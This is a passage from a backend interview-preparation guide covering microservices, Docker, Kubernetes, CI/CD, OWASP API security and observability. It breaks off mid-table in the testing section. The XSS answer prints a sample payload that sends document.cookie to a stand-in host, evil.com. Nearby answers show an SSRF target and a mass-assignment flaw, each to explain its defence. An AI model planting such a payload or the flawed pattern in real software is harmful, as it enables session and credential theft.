+### Q12. What are CQRS and event sourcing?
+**Answer:** **CQRS** (Command Query Responsibility Segregation): separate models for writes (commands) and reads (queries), e.g. writes go to Postgres, a denormalized read model in Elasticsearch serves search. **Event sourcing**: store every change as an immutable event and rebuild current state by replaying them (full audit history, time travel), at the cost of complexity. Use only when the domain truly needs it (finance ledgers, audit-heavy systems).
+
+### Q13. What is an API gateway?
+**Answer:** A single entry point in front of backend services that handles cross-cutting concerns: **routing** to services, **authentication** (validate JWT once), **rate limiting**, TLS termination, request/response transformation, caching, logging/metrics, CORS. Examples: Kong, NGINX, AWS API Gateway, Envoy, Traefik. A **BFF** (Backend for Frontend) is a gateway tailored to one client type (web vs mobile) that aggregates calls.
+
+**Example (routing concept):**
+```
+api.shop.com/v1/users/*     → user-service
+api.shop.com/v1/orders/*    → order-service
+api.shop.com/v1/payments/*  → payment-service
+(all: verify JWT, 100 req/min per key, add X-Request-Id)
+```
+
+### Q14. What is service discovery and a service mesh?
+**Answer:** **Service discovery** lets services find each other's current addresses as instances come and go (Kubernetes DNS `order-service.default.svc`, Consul). A **service mesh** (Istio, Linkerd) adds a sidecar proxy to every service to handle mTLS encryption, retries, timeouts, traffic splitting and metrics — without changing application code.
+
+### Q15. How do you handle data and queries that span microservices?
+**Answer:** Each service owns its database; others can't query it directly. Options: call the owning service's API (sync), keep a **local read-only copy** updated by events (eventual consistency), or build a dedicated read model / reporting store (CQRS, data warehouse). Avoid shared databases — they couple services tightly.
+
+### Q16. Polling vs long polling vs SSE vs WebSockets?
+**Answer:**
+| Technique | How | Use |
+|---|---|---|
+| Short polling | Client asks every N seconds | Simple, wasteful, delayed |
+| Long polling | Server holds request until data or timeout | Fallback when others aren't available |
+| **SSE** | One-way server → client stream over HTTP, auto-reconnect | Notifications, live scores, AI response streaming |
+| **WebSockets** | Full-duplex persistent connection | Chat, multiplayer, collaborative editing, live trading |
+
+**Example (SSE in Express):**
+```ts
+app.get('/v1/orders/:id/events', (req, res) => {
+  res.set({ 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache', Connection: 'keep-alive' });
+  const send = (status: string) => res.write(`data: ${JSON.stringify({ status })}\n\n`);
+  orderEvents.on(req.params.id, send);
+  req.on('close', () => orderEvents.off(req.params.id, send));
+});
+```
+
+### Q17. How do WebSockets work and how do you scale them?
+**Answer:** The client sends an HTTP request with `Upgrade: websocket`; the server replies `101 Switching Protocols`, and the TCP connection stays open for two-way messages. **Authenticate during the handshake** (token in query/cookie, then verify). Send **heartbeats** (ping/pong) to detect dead connections; clients reconnect with backoff.
+
+**Scaling**: each connection lives on one server. To message a user connected to another server, use **Redis Pub/Sub** (Socket.IO Redis adapter) or a broker to broadcast across instances; use **sticky sessions** at the load balancer; track `userId → serverId` in Redis; scale by connection count and memory.
+
+**Example (Socket.IO):**
+```ts
+import { Server } from 'socket.io';
+import { createAdapter } from '@socket.io/redis-adapter';
+
+const io = new Server(httpServer, { cors: { origin: 'https://app.shop.com' } });
+io.adapter(createAdapter(pubClient, subClient));     // multi-instance
+
+io.use((socket, next) => {
+  try {
+    socket.data.user = jwt.verify(socket.handshake.auth.token, PUBLIC_KEY);
+    next();
+  } catch { next(new Error('Unauthorized')); }
+});
+
+io.on('connection', (socket) => {
+  socket.join(`user:${socket.data.user.sub}`);
+  socket.on('chat:send', async (msg) => {
+    const saved = await messages.save(socket.data.user.sub, msg);
+    io.to(`user:${msg.toUserId}`).emit('chat:new', saved);
+  });
+});
+```
+
+### Q18. What is serverless? Pros and cons?
+**Answer:** You deploy functions (AWS Lambda, Google Cloud Functions, Azure Functions, Vercel/Cloudflare) that run on events (HTTP, queue message, S3 upload, cron) — no servers to manage, automatic scaling, **pay per use**, scale to zero.
+**Cons**: **cold starts** (first call latency), execution time limits (15 min on Lambda), stateless, hard local debugging, **DB connection exhaustion** (thousands of concurrent functions each open connections — use RDS Proxy or HTTP-based DBs), vendor lock-in, can be expensive at constant high load.
+
+**Example (Lambda handler for S3 upload):**
+```ts
+export const handler = async (event: S3Event) => {
+  for (const record of event.Records) {
+    const key = record.s3.object.key;
+    const image = await s3.getObject({ Bucket: record.s3.bucket.name, Key: key });
+    const thumb = await sharp(await image.Body!.transformToByteArray()).resize(200).toBuffer();
+    await s3.putObject({ Bucket: 'thumbnails', Key: key, Body: thumb });
+  }
+};
+```
+
+### Q19. What is the difference between 2PC (two-phase commit) and Saga?
+**Answer:** **2PC** uses a coordinator that asks all participants to "prepare" and then "commit" — strongly consistent but blocking, slow, and fragile if the coordinator fails; rarely used across microservices. **Saga** uses local transactions + compensations — available and scalable, but only eventually consistent and compensations must be designed carefully.
+
+---
+
+## 15. Docker and Docker Compose
+
+### Q1. What is Docker? Image vs container?
+**Answer:** Docker packages an application with its runtime, libraries and config into a portable unit, so it runs the same on a laptop, CI and production ("works on my machine" solved). An **image** is a read-only template built in layers from a Dockerfile. A **container** is a running instance of an image with its own writable layer, process space and network.
+
+**Example:**
+```bash
+docker build -t shop-api:1.0 .
+docker run -d -p 3000:3000 --env-file .env --name api shop-api:1.0
+docker ps
+docker logs -f api
+docker exec -it api sh
+```
+
+### Q2. Container vs virtual machine?
+**Answer:** A **VM** virtualises hardware and runs a full guest OS (heavy: GBs, minutes to boot). A **container** shares the host's kernel and isolates processes with namespaces and cgroups (light: MBs, starts in seconds). VMs give stronger isolation; containers give density and speed.
+
+### Q3. Explain the main Dockerfile instructions.
+**Answer:** `FROM` (base image), `WORKDIR` (working directory), `COPY`/`ADD` (copy files), `RUN` (execute at build time), `ENV` (environment variable), `ARG` (build-time variable), `EXPOSE` (documents the port), `USER` (run as user), `CMD` (default command, overridable), `ENTRYPOINT` (fixed executable; `CMD` becomes its arguments), `HEALTHCHECK`.
+
+### Q4. How does layer caching work and how do you use it?
+**Answer:** Each instruction creates a layer; if an instruction and its inputs haven't changed, Docker reuses the cached layer. Once one layer changes, all later layers rebuild. So copy dependency files and install **before** copying source code.
+
+**Example:**
+```dockerfile
+# ✅ code changes don't trigger npm ci
+COPY package*.json ./
+RUN npm ci
+COPY . .
+
+# ❌ any code change reinstalls all dependencies
+COPY . .
+RUN npm ci
+```
+
+### Q5. What is a multi-stage build and why use it?
+**Answer:** Use one stage with build tools to compile, then copy only the output into a small runtime image. Result: smaller, faster to pull, fewer vulnerabilities, no source code or dev dependencies in production.
+
+**Example (Node/TypeScript):**
+```dockerfile
+FROM node:22-alpine AS build
+WORKDIR /app
+COPY package*.json ./
+RUN npm ci
+COPY . .
+RUN npm run build && npm prune --omit=dev
+
+FROM node:22-alpine
+WORKDIR /app
+ENV NODE_ENV=production
+COPY --from=build /app/node_modules ./node_modules
+COPY --from=build /app/dist ./dist
+COPY package.json ./
+USER node
+EXPOSE 3000
+HEALTHCHECK CMD wget -qO- http://localhost:3000/health || exit 1
+CMD ["node", "dist/server.js"]
+```
+
+**Example (Go — tiny final image):**
+```dockerfile
+FROM golang:1.23 AS build
+WORKDIR /src
+COPY go.mod go.sum ./
+RUN go mod download
+COPY . .
+RUN CGO_ENABLED=0 go build -o /app ./cmd/api
+
+FROM gcr.io/distroless/static
+COPY --from=build /app /app
+USER nonroot
+ENTRYPOINT ["/app"]
+```
+
+### Q6. How do you make a Docker image secure and small?
+**Answer:** Use slim/alpine/distroless base images pinned to a version; multi-stage builds; run as **non-root** (`USER`); add a `.dockerignore` (node_modules, .git, .env); never bake secrets into images (pass at runtime); scan images (Trivy, Docker Scout); keep base images updated.
+
+**Example `.dockerignore`:**
+```
+node_modules
+.git
+.env
+dist
+coverage
+*.log
+```
+
+### Q7. `CMD` vs `ENTRYPOINT`?
+**Answer:** `ENTRYPOINT` sets the executable that always runs; `CMD` provides default arguments (or a default command) that `docker run ... <args>` can override. Use exec form (JSON array) so signals like SIGTERM reach your app for graceful shutdown.
+
+**Example:**
+```dockerfile
+ENTRYPOINT ["node", "dist/cli.js"]
+CMD ["--help"]
+# docker run image migrate   → node dist/cli.js migrate
+```
+
+### Q8. Volumes vs bind mounts? How do containers talk to each other?
+**Answer:** **Volumes** are managed by Docker and persist data beyond the container's life (database files). **Bind mounts** map a host folder into the container (live code reload in development). Containers on the same Docker **network** reach each other by **service/container name** (e.g. `postgres:5432`), not `localhost`.
+
+### Q9. What is Docker Compose? Give an example for API + Postgres + Redis.
+**Answer:** Compose defines and runs multi-container applications from one YAML file — ideal for local development and integration tests.
+
+**Example:**
+```yaml
+services:
+  api:
+    build: .
+    ports: ["3000:3000"]
+    environment:
+      DATABASE_URL: postgres://app:secret@db:5432/shop
+      REDIS_URL: redis://redis:6379
+    depends_on:
+      db:
+        condition: service_healthy
+      redis:
+        condition: service_started
+    restart: unless-stopped
+
+  worker:
+    build: .
+    command: ["node", "dist/worker.js"]
+    environment:
+      DATABASE_URL: postgres://app:secret@db:5432/shop
+      REDIS_URL: redis://redis:6379
+    depends_on: [db, redis]
+
+  db:
+    image: postgres:16
+    environment:
+      POSTGRES_USER: app
+      POSTGRES_PASSWORD: secret
+      POSTGRES_DB: shop
+    volumes: [pgdata:/var/lib/postgresql/data]
+    healthcheck:
+      test: ["CMD-SHELL", "pg_isready -U app"]
+      interval: 5s
+      retries: 5
+
+  redis:
+    image: redis:7-alpine
+
+volumes:
+  pgdata:
+```
+```bash
+docker compose up -d --build
+docker compose logs -f api
+docker compose exec db psql -U app shop
+docker compose down -v      # -v also deletes volumes
+```
+
+---
+
+## 16. CI/CD, Cloud and Kubernetes
+
+### Q1. What are CI and CD?
+**Answer:** **Continuous Integration**: every push/PR automatically runs lint, type checks, tests and a build, so problems are caught early and the main branch stays healthy. **Continuous Delivery**: every passing build is ready to deploy (deploy with one click). **Continuous Deployment**: every passing build deploys to production automatically.
+
+### Q2. Describe a typical CI/CD pipeline.
+**Answer:**
+1. Developer opens a PR → **CI**: install (`npm ci`), lint, type-check, unit tests, integration tests (with Postgres/Redis service containers), build, security scan (`npm audit`, Trivy), code review.
+2. Merge to main → build Docker image tagged with the **git SHA** → push to registry (ECR/GHCR).
+3. Deploy to **staging** → run migrations → smoke tests / e2e tests.
+4. Deploy to **production** (rolling/canary/blue-green) → monitor metrics → auto-rollback on errors.
+
+**Example (GitHub Actions):**
+```yaml
+name: CI
+on:
+  pull_request:
+  push:
+    branches: [main]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    services:
+      postgres:
+        image: postgres:16
+        env: { POSTGRES_PASSWORD: test, POSTGRES_DB: shop_test }
+        ports: ["5432:5432"]
+        options: --health-cmd pg_isready --health-interval 5s --health-retries 5
+      redis:
+        image: redis:7
+        ports: ["6379:6379"]
+    env:
+      DATABASE_URL: postgres://postgres:test@localhost:5432/shop_test
+      REDIS_URL: redis://localhost:6379
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with: { node-version: 22, cache: npm }
+      - run: npm ci
+      - run: npm run lint
+      - run: npm run typecheck
+      - run: npm run migrate
+      - run: npm test -- --coverage
+      - run: npm audit --audit-level=high
+
+  docker:
+    needs: test
+    if: github.ref == 'refs/heads/main'
+    runs-on: ubuntu-latest
+    permissions: { contents: read, packages: write }
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/login-action@v3
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+      - uses: docker/build-push-action@v6
+        with:
+          push: true
+          tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
+```
+
+### Q3. Rolling vs blue-green vs canary deployments? What are feature flags?
+**Answer:**
+- **Rolling**: replace instances a few at a time; no extra infrastructure; old and new versions run together briefly.
+- **Blue-green**: run the new version (green) alongside the old (blue), switch all traffic at once; instant rollback by switching back; needs double capacity.
+- **Canary**: send a small % of traffic (e.g. 5%) to the new version, watch metrics, then increase gradually; limits blast radius.
+- **Feature flags**: deploy code switched off, then enable it for some users without a deploy; decouples deployment from release.
+
+### Q4. How do you run database migrations with zero downtime?
+**Answer:** During a rolling deploy, old and new code run at the same time, so every migration must work with **both** versions. Use **expand → migrate → contract**: add new columns/tables (nullable), deploy code that writes both, backfill, switch reads, then remove old columns in a later release. Avoid long table locks (create indexes `CONCURRENTLY`, batch backfills).
+
+### Q5. How do you manage secrets in CI/CD and production?
+**Answer:** Never commit secrets to git. Use the CI's secret store (GitHub Actions secrets), a secret manager (AWS Secrets Manager, Vault, GCP Secret Manager) or Kubernetes Secrets (encrypted at rest); inject at runtime as env vars or mounted files; rotate regularly; least-privilege access; scan repos for leaked secrets (gitleaks).
+
+### Q6. Which cloud services should a backend engineer know? (AWS examples)
+**Answer:**
+| Need | AWS | GCP | Azure |
+|---|---|---|---|
+| VMs | EC2 | Compute Engine | Virtual Machines |
+| Containers | ECS/Fargate, EKS | Cloud Run, GKE | Container Apps, AKS |
+| Functions | Lambda | Cloud Functions | Functions |
+| SQL | RDS, Aurora | Cloud SQL | Azure SQL / Database for PostgreSQL |
+| Object storage | S3 | Cloud Storage | Blob Storage |
+| Cache | ElastiCache | Memorystore | Azure Cache for Redis |
+| Queue / events | SQS, SNS, EventBridge | Pub/Sub | Service Bus, Event Grid |
+| Load balancer | ALB / NLB | Cloud Load Balancing | Application Gateway |
+| CDN / DNS | CloudFront, Route 53 | Cloud CDN, Cloud DNS | Front Door, Azure DNS |
+| Secrets | Secrets Manager | Secret Manager | Key Vault |
+| Monitoring | CloudWatch | Cloud Monitoring | Azure Monitor |
+| Identity | IAM | IAM | Entra ID / RBAC |
+
+### Q7. Explain VPC, subnets and security groups.
+**Answer:** A **VPC** is your private network in the cloud. **Public subnets** have a route to the internet (load balancers, NAT gateway); **private subnets** don't (app servers, databases). **Security groups** are stateful firewalls on instances (e.g. DB accepts port 5432 only from the app's security group). Deploy across multiple **availability zones** for high availability.
+
+**Example layout:**
+```
+Internet → ALB (public subnets, 2 AZs) → API containers (private subnets) → RDS Postgres (private, Multi-AZ)
+                                                   ↘ ElastiCache Redis (private)
+```
+
+### Q8. What is IAM and least privilege?
+**Answer:** IAM controls who/what can do which actions on which resources. **Least privilege**: give each user/service only the permissions it needs. Services use **roles** (temporary credentials), not long-lived access keys.
+
+**Example policy:** the upload service may only put objects into one bucket prefix.
+```json
+{
+  "Effect": "Allow",
+  "Action": ["s3:PutObject"],
+  "Resource": "arn:aws:s3:::shop-uploads/users/*"
+}
+```
+
+### Q9. What is Infrastructure as Code?
+**Answer:** Defining infrastructure (networks, databases, clusters) in code files that are version-controlled, reviewed and applied automatically — reproducible environments and no manual clicking. Tools: **Terraform**, AWS CDK, Pulumi, CloudFormation.
+
+**Example (Terraform):**
+```hcl
+resource "aws_s3_bucket" "uploads" {
+  bucket = "shop-uploads-prod"
+}
+resource "aws_sqs_queue" "emails" {
+  name                       = "email-jobs"
+  visibility_timeout_seconds = 60
+}
+```
+
+### Q10. What is Kubernetes and why use it?
+**Answer:** A container orchestrator: it schedules containers across a cluster of machines, restarts failed ones (self-healing), scales them, does rolling updates/rollbacks, provides service discovery and load balancing, and manages config and secrets — all from declarative YAML describing the desired state.
+
+### Q11. Explain Pod, Deployment, ReplicaSet, Service, Ingress, ConfigMap, Secret.
+**Answer:**
+- **Pod**: smallest unit; one or more containers sharing network/storage.
+- **ReplicaSet**: keeps N identical pods running.
+- **Deployment**: manages ReplicaSets; handles rolling updates and rollbacks.
+- **Service**: stable virtual IP/DNS name load-balancing to pods (`ClusterIP` internal, `NodePort`, `LoadBalancer` external).
+- **Ingress**: HTTP routing from outside (host/path rules, TLS) to Services.
+- **ConfigMap / Secret**: configuration and sensitive values injected as env vars or files.
+- Also: **Namespace** (isolation), **StatefulSet** (stable identity/storage for databases), **DaemonSet** (one pod per node, e.g. log agents), **Job/CronJob** (batch tasks), **HPA** (autoscaling).
+
+**Example:**
+```yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: order-api
+spec:
+  replicas: 3
+  selector:
+    matchLabels: { app: order-api }
+  strategy:
+    rollingUpdate: { maxUnavailable: 0, maxSurge: 1 }
+  template:
+    metadata:
+      labels: { app: order-api }
+    spec:
+      containers:
+        - name: api
+          image: ghcr.io/shop/order-api:3f9c2a1
+          ports: [{ containerPort: 3000 }]
+          envFrom:
+            - configMapRef: { name: order-api-config }
+            - secretRef: { name: order-api-secrets }
+          resources:
+            requests: { cpu: "250m", memory: "256Mi" }
+            limits: { cpu: "1", memory: "512Mi" }
+          readinessProbe:
+            httpGet: { path: /health/ready, port: 3000 }
+            periodSeconds: 5
+          livenessProbe:
+            httpGet: { path: /health/live, port: 3000 }
+            initialDelaySeconds: 10
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: order-api
+spec:
+  selector: { app: order-api }
+  ports: [{ port: 80, targetPort: 3000 }]
+---
+apiVersion: autoscaling/v2
+kind: HorizontalPodAutoscaler
+metadata:
+  name: order-api
+spec:
+  scaleTargetRef: { apiVersion: apps/v1, kind: Deployment, name: order-api }
+  minReplicas: 3
+  maxReplicas: 20
+  metrics:
+    - type: Resource
+      resource: { name: cpu, target: { type: Utilization, averageUtilization: 70 } }
+```
+
+### Q12. Liveness vs readiness vs startup probes?
+**Answer:** **Liveness**: "is the process stuck?" — if it fails, Kubernetes restarts the container. **Readiness**: "can it take traffic now?" — if it fails, the pod is removed from the Service (no restart); e.g. while warming up or when the DB is unreachable. **Startup**: gives slow-starting apps time before liveness checks begin. Keep liveness simple (don't check the DB there, or a DB outage restarts every pod).
+
+### Q13. Requests vs limits? What happens when they're exceeded?
+**Answer:** **Requests** are guaranteed resources used for scheduling. **Limits** are the maximum. Exceeding the **CPU limit** → throttled (slower). Exceeding the **memory limit** → container is killed (**OOMKilled**) and restarted.
+
+### Q14. Which kubectl commands do you use to debug a pod?
+**Answer & Example:**
+```bash
+kubectl get pods -n shop
+kubectl describe pod order-api-7d9f-abc -n shop     # events: ImagePullBackOff, OOMKilled, probe failures
+kubectl logs order-api-7d9f-abc -n shop --previous  # logs of the crashed container
+kubectl exec -it order-api-7d9f-abc -n shop -- sh
+kubectl rollout status deployment/order-api -n shop
+kubectl rollout undo deployment/order-api -n shop   # rollback
+kubectl top pods -n shop                            # CPU/memory usage
+```
+Common statuses: `CrashLoopBackOff` (app keeps crashing — check logs/config), `ImagePullBackOff` (wrong image/registry auth), `Pending` (not enough cluster resources), `OOMKilled` (memory limit).
+
+### Q15. What are Helm and GitOps?
+**Answer:** **Helm** is a package manager for Kubernetes: templated YAML ("charts") with values per environment. **GitOps** (Argo CD, Flux): the desired cluster state lives in git; a controller continuously syncs the cluster to match the repo, so deploys and rollbacks are git commits.
+
+---
+
+## 17. API Security and OWASP
+
+### Q1. What is the OWASP API Security Top 10 (2023)?
+**Answer:**
+| # | Risk | Short defence |
+|---|---|---|
+| API1 | Broken Object Level Authorization (IDOR) | Check ownership/tenant on every object |
+| API2 | Broken Authentication | Strong hashing, MFA, short-lived tokens, login rate limits |
+| API3 | Broken Object Property Level Authorization | Allow-list writable fields (mass assignment); response DTOs (data exposure) |
+| API4 | Unrestricted Resource Consumption | Rate limits, pagination caps, body size limits, timeouts |
+| API5 | Broken Function Level Authorization | Role/permission checks on every admin function; deny by default |
+| API6 | Unrestricted Access to Sensitive Business Flows | Protect flows like signup, booking, coupon use from automation |
+| API7 | Server-Side Request Forgery (SSRF) | Allow-list outbound URLs; block internal/metadata IPs |
+| API8 | Security Misconfiguration | Secure headers, strict CORS, no debug/stack traces, patching |
+| API9 | Improper Inventory Management | Track all API versions/environments; retire old ones |
+| API10 | Unsafe Consumption of APIs | Validate third-party responses; timeouts; TLS |
+
+### Q2. What is mass assignment and how do you prevent it?
+**Answer:** Passing the whole request body into a DB update lets attackers set fields they shouldn't (`role`, `isVerified`, `balance`). Prevent by validating against a schema that allows only specific fields.
+
+**Example:**
+```ts
+// ❌ attacker sends {"name":"Asha","role":"admin"}
+await User.updateOne({ _id: req.user.id }, req.body);
+
+// ✅ allow-list
+const UpdateProfile = z.object({ name: z.string().max(100), phone: z.string().optional() }).strict();
+await User.updateOne({ _id: req.user.id }, UpdateProfile.parse(req.body));
+```
+
+### Q3. What is XSS and how do you prevent it?
+**Answer:** **Cross-Site Scripting**: an attacker injects JavaScript that runs in other users' browsers (stealing tokens, acting as the user). Types: stored, reflected, DOM-based. Prevent by escaping output (React does by default), sanitizing any HTML you render (DOMPurify), a **Content-Security-Policy** header, `HttpOnly` cookies, and validating input.
+
+**Example:**
+```
+Comment saved: <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
+```
+```ts
+app.use(helmet({ contentSecurityPolicy: { directives: { defaultSrc: ["'self'"], scriptSrc: ["'self'"] } } }));
+```
+
+### Q4. What is CSRF and how do you prevent it?
+**Answer:** **Cross-Site Request Forgery**: a malicious site makes the user's browser send a request to your site, and the browser automatically attaches the user's cookies. Only affects **cookie-based** auth. Prevent with `SameSite=Lax/Strict` cookies, CSRF tokens (double-submit or synchronizer), and checking `Origin`/`Referer` headers. APIs using `Authorization: Bearer` headers are not vulnerable in the same way.
+
+### Q5. What is SSRF?
+**Answer:** **Server-Side Request Forgery**: your server fetches a URL supplied by the user (e.g. "import image from URL"), and an attacker points it at internal services — like the cloud metadata endpoint `http://169.254.169.254/` to steal credentials. Prevent by allow-listing domains, resolving and blocking private/internal IP ranges, disabling redirects, and using IMDSv2 on AWS.
+
+### Q6. How do you protect a login endpoint?
+**Answer:** Rate limit per IP and per account; progressive delays or temporary lockout; CAPTCHA after several failures; MFA; same error message for unknown user and wrong password; bcrypt/Argon2 hashing; log and alert on suspicious patterns; check passwords against breached-password lists.
+
+### Q7. What security headers should an API/web app send?
+**Answer:** `Strict-Transport-Security` (force HTTPS), `Content-Security-Policy` (limit script sources), `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY` / CSP `frame-ancestors` (clickjacking), `Referrer-Policy`. In Express, `helmet()` sets sensible defaults. Remove `X-Powered-By`.
+
+### Q8. Give a security hardening checklist for an Express API.
+**Answer & Example:**
+```ts
+app.disable('x-powered-by');
+app.use(helmet());
+app.use(cors({ origin: env.ALLOWED_ORIGINS.split(','), credentials: true }));
+app.use(express.json({ limit: '100kb' }));
+app.use(rateLimit({ windowMs: 60_000, max: 100 }));
+app.use('/v1/auth/login', rateLimit({ windowMs: 15 * 60_000, max: 5 }));
+// + schema validation on every route
+// + requireAuth + permission + ownership checks
+// + parameterised queries
+// + generic error messages (details only in logs)
+// + secrets from a secret manager
+// + dependency scanning in CI (npm audit, Dependabot, Snyk)
+// + audit logs for sensitive actions
+```
+
+### Q9. How do you secure service-to-service communication?
+**Answer:** Keep internal services in private networks; use **mTLS** (both sides present certificates, often via a service mesh); service identity tokens (OAuth client credentials or signed JWTs with short expiry); least-privilege permissions per service; never trust a request just because it's "internal" (zero trust).
+
+### Q10. How do you handle sensitive data (PII) in an API?
+**Answer:** Collect only what you need; encrypt in transit (TLS) and at rest (DB/disk encryption, field-level encryption for very sensitive fields); mask in responses (`****1234`); redact from logs; restrict access by role; set retention and deletion policies; follow regulations (India's DPDP Act, GDPR).
+
+---
+
+## 18. Observability
+
+### Q1. What are the three pillars of observability?
+**Answer:**
+| Pillar | Question it answers | Tools |
+|---|---|---|
+| **Logs** | What exactly happened in this request? | ELK/OpenSearch, Loki, CloudWatch Logs |
+| **Metrics** | How much/how often/how fast, over time? Is something wrong? | Prometheus + Grafana, Datadog, CloudWatch |
+| **Traces** | Where did the time go across services for this request? | OpenTelemetry + Jaeger/Tempo/Zipkin |
+
+Monitoring tells you **that** something is wrong; observability helps you find **why**.
+
+### Q2. What is the ELK stack?
+**Answer:** **E**lasticsearch (stores and indexes logs, full-text search), **L**ogstash (collects, parses, transforms logs; often replaced by lighter Beats/Fluent Bit), **K**ibana (search UI and dashboards). **OpenSearch** is the open-source fork of Elasticsearch + Kibana (OpenSearch Dashboards).
+
+**Example flow:**
+```
+App (JSON logs to stdout) → Fluent Bit (on each node) → Elasticsearch/OpenSearch → Kibana
+Kibana query:  service:"order-api" AND level:"error" AND requestId:"req_7f3a9c"
+```
+
+### Q3. How does Prometheus work?
+**Answer:** Prometheus **pulls** (scrapes) metrics over HTTP from each service's `/metrics` endpoint at an interval (e.g. 15 s) and stores them as **time series** (metric name + labels + timestamps/values). You query with **PromQL**, define alert rules, and send alerts via Alertmanager. Short-lived jobs can push to a Pushgateway.
+
+### Q4. Counter vs gauge vs histogram vs summary?
+**Answer:**
+- **Counter**: only increases (resets on restart) — total requests, errors, orders placed. Use `rate()` on it.
+- **Gauge**: goes up and down — memory, active connections, queue length.
+- **Histogram**: counts observations in buckets — request duration, response size; lets you compute percentiles across instances.
+- **Summary**: computes quantiles in the client (can't be aggregated across instances).
+
+**Example (prom-client in Express):**
+```ts
+import client from 'prom-client';
+client.collectDefaultMetrics();
+
+const httpDuration = new client.Histogram({
+  name: 'http_request_duration_seconds',
+  help: 'HTTP request duration',
+  labelNames: ['method', 'route', 'status'],
+  buckets: [0.05, 0.1, 0.25, 0.5, 1, 2.5, 5],
+});
+const ordersPlaced = new client.Counter({ name: 'orders_placed_total', help: 'Orders placed' });
+
+app.use((req, res, next) => {
+  const end = httpDuration.startTimer();
+  res.on('finish', () => end({ method: req.method, route: req.route?.path ?? 'unknown', status: res.statusCode }));
+  next();
+});
+
+app.get('/metrics', async (_req, res) => {
+  res.set('Content-Type', client.register.contentType);
+  res.end(await client.register.metrics());
+});
+```
+
+### Q5. Write common PromQL queries.
+**Answer & Example:**
+```promql
+# Requests per second, per route
+sum(rate(http_request_duration_seconds_count[5m])) by (route)
+
+# Error rate (% of 5xx)
+sum(rate(http_request_duration_seconds_count{status=~"5.."}[5m]))
+  / sum(rate(http_request_duration_seconds_count[5m])) * 100
+
+# p95 latency
+histogram_quantile(0.95, sum(rate(http_request_duration_seconds_bucket[5m])) by (le))
+
+# Alert rule example
+- alert: HighErrorRate
+  expr: (sum(rate(http_request_duration_seconds_count{status=~"5.."}[5m])) / sum(rate(http_request_duration_seconds_count[5m]))) > 0.05
+  for: 5m
+  labels: { severity: page }
+  annotations: { summary: "Error rate above 5% for 5 minutes" }
+```
+
+### Q6. What is Grafana?
+**Answer:** A visualisation and dashboarding tool that connects to many data sources (Prometheus, Loki, Elasticsearch, Tempo, PostgreSQL, CloudWatch) and supports alerting. A typical service dashboard shows request rate, error rate, p50/p95/p99 latency, CPU/memory, DB connection pool usage, queue length, and business metrics (orders per minute).
+
+### Q7. Why use percentiles (p95, p99) instead of averages?
+**Answer:** Averages hide outliers. If 99 requests take 50 ms and 1 takes 5 s, the average is ~100 ms (looks fine), but 1% of users wait 5 s. p99 shows the experience of the slowest 1%, who are often your most active users.
+
+### Q8. What are RED, USE and the four golden signals?
+**Answer:**
+- **RED** (for services): **R**ate, **E**rrors, **D**uration.
+- **USE** (for resources like CPU, disk, DB pool): **U**tilization, **S**aturation, **E**rrors.
+- **Four golden signals** (Google SRE): latency, traffic, errors, saturation.
+
+### Q9. What are SLI, SLO, SLA and error budget?
+**Answer:**
+- **SLI** (indicator): a measured value — "% of requests served successfully under 300 ms".
+- **SLO** (objective): internal target — "99.5% over 30 days".
+- **SLA** (agreement): contract with customers, with penalties if missed (usually looser than the SLO).
+- **Error budget**: 100% − SLO = allowed failure (0.5% ≈ 3.6 h/month). If it's used up, slow down releases and focus on reliability.
+
+### Q10. What is distributed tracing? Explain traces, spans and context propagation.
+**Answer:** A **trace** follows one request across all services. It's made of **spans** — timed operations (HTTP handler, DB query, call to another service) with parent-child relationships, attributes and status. **Context propagation** passes the trace id between services in headers (W3C `traceparent`), so all spans join one trace. The waterfall view shows exactly which step was slow or failed.
+
+**Example header:**
+```
+traceparent: 00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01
+             version-trace id (32 hex)-parent span id-flags
+```
+
+### Q11. What is OpenTelemetry?
+**Answer:** A vendor-neutral open standard and set of SDKs for generating and exporting **traces, metrics and logs**. It offers **auto-instrumentation** for common libraries (HTTP, Express, pg, Redis, Kafka). Data is sent via **OTLP** to the **OpenTelemetry Collector**, which processes it and exports to any backend (Jaeger, Tempo, Prometheus, Datadog, New Relic) — so you can switch vendors without changing code.
+
+**Example (Node auto-instrumentation):**
+```ts
+// tracing.ts — load before anything else: node -r ./dist/tracing.js dist/server.js
+import { NodeSDK } from '@opentelemetry/sdk-node';
+import { getNodeAutoInstrumentations } from '@opentelemetry/auto-instrumentations-node';
+import { OTLPTraceExporter } from '@opentelemetry/exporter-trace-otlp-http';
+
+const sdk = new NodeSDK({
+  serviceName: 'order-api',
+  traceExporter: new OTLPTraceExporter({ url: 'http://otel-collector:4318/v1/traces' }),
+  instrumentations: [getNodeAutoInstrumentations()],
+});
+sdk.start();
+
+// Custom span for business logic
+import { trace } from '@opentelemetry/api';
+const tracer = trace.getTracer('order-service');
+await tracer.startActiveSpan('reserveStock', async (span) => {
+  span.setAttribute('order.id', orderId);
+  try { await inventory.reserve(items); }
+  catch (e) { span.recordException(e as Error); throw e; }
+  finally { span.end(); }
+});
+```
+
+### Q12. How do you connect logs, metrics and traces?
+**Answer:** Put the **trace id** (and request id) in every log line; use exemplars to link metric spikes to example traces; use consistent `service.name` and environment labels everywhere. Then you go: alert on metric → open dashboard → jump to a slow trace → open the logs for that trace id.
+
+### Q13. What makes a good alert?
+**Answer:** Alert on **symptoms users feel** (error rate, latency, SLO burn rate), not every CPU spike. Every alert must be actionable, have an owner and a **runbook**, and avoid noise (alert fatigue makes people ignore real problems). Use severity levels: page for urgent, ticket for non-urgent.
+
+---
+
+## 19. Testing
+
+### Q1. What is the testing pyramid?
+**Answer:** Many fast, cheap **unit tests** at the bottom; fewer **integration tests** in the middle; a small number of slow, expensive **end-to-end tests** at the top. This gives fast feedback and good confidence at reasonable cost.
+
+### Q2. Unit vs integration vs end-to-end tests?
+**Answer:**
+| Type | Scope | Speed | Example |
